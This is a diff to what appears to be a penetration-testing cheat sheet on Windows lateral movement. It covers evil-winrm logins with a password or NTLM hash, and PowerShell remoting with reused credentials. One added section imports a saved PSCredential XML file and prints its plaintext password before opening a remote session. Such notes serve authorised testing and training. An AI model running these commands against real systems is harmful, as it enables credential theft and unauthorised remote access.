@@ -21,22 +21,39 @@ evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
 evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
 ```
 
-### PowerShell Remoting
+### PowerShell Remoting/PSCredential Reuse
 
 *Requires valid Kerberos Ticket (PtT) or active NTLM Injection (PtH) in the current session.*
 
-**Ports**
-*   TCP/5985 (HTTP)
-*   TCP/5986 (HTTPS)
-
 **Requirements**
-*   Administrative permissions **OR**
-*   Member of "Remote Management Users" **OR**
-*   Explicit PSSession configuration
+- WinRM Enabled
+- One of the following:
+    - `Administrator` **OR**
+    - Member of `Remote Management Users` **OR**
+    - Explicit PSSession configuration (created with `Register-PSSessionConfiguration`)
+
+- NOTE: PSCredential XML files can only be decrypted by the user who created them on the same machine because the DPAPI keys encrypt the credentials
+
+#### via Plaintext Credentials
 
 ```powershell
-# PowerShell
-$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
-Enter-PSSession -Credential $cred -ComputerName <TARGET_HOSTNAME>
+$secpassword = ConvertTo-SecureString -AsPlainText -Force '<PASSWORD>'
+$cred = New-Object System.Management.Automation.PSCredential '<USER>', $secpassword
+
+New-PSSession -Credential $cred -ComputerName <TARGET>
+Enter-PSSession -Id <SESSION_ID>
+```
+
+#### via XML File
+
+```powershell
+$cred = Import-CliXml -Path <PATH_TO_XML>
+
+# Inspect (encrypted w/ user's DPAPI key)
+$cred.Username
+$cred.GetNetworkCredential().Password
+
+# Open session
+New-PSSession -Credential $cred -ComputerName <TARGET>
+Enter-PSSession -Id <SESSION_ID>
 ```
